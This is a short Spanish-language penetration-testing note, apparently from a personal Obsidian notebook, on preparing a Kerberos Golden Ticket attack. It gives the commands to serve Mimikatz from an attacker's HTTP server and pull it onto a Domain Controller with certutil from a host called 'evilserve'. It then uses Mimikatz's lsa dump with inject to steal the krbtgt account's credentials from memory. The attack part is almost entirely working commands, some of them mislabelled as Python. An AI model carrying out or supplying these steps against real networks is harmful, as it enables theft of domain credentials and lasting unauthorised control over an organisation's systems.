Para crear un Golden Ticket son necesarios algunos datos del usuario krbtgt, estos los vamos a extraer usando [[Mimikatz]] dentro del DC (Domain Controller), para meter el Mimikatz dentro del DC recomiendo usar [[certutil]]:

Primero tenemos que hacer un servidor para hostear nuestro archivo Mmikatz, el cual podemos encontrar en [este](https://github.com/ParrotSec/mimikatz.git) repositorio de Github:

```python
sudo python3 -m http.server 1234
```

Ahora desde el DC vamos a descargarnos la herramienta (Para acceder al DC de forma remota mirar [[psexec]]):

``` Python
certutil -urlcache -split -f http://evilserve:1234/Mimikatz.exe Mimikatz.exe
```

Ya con el Mimikatz lo vamos a ejecutar:

```Python
Mimikatz
```

Para extraer las credenciales de krbtgt en la memoria de LSA (Local System Authority) usaremos el siguiente comando de [[Mimikatz]]: 

```python
lsadump::lsa /inject /name:krbtgt
```

A continuación voy a desglosar el porque usamos cada uno de los parametros:

- **/name:** El usuario cuyas credenciales serán robadas 

- **/inject:** Injecta un Payload en memoria que permite mostrarnos información mas privilegiada

Esto nos dará algo similar a esto:

![[Pasted image 20250428160113.png]]

Aqui ya estarán todos los datos que necesitamos para construir el golden ticket 
##### Recursos 
- [Hack Tricks](https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/credentials-mimikatz.html?highlight=Mimikatz#mimikatz)
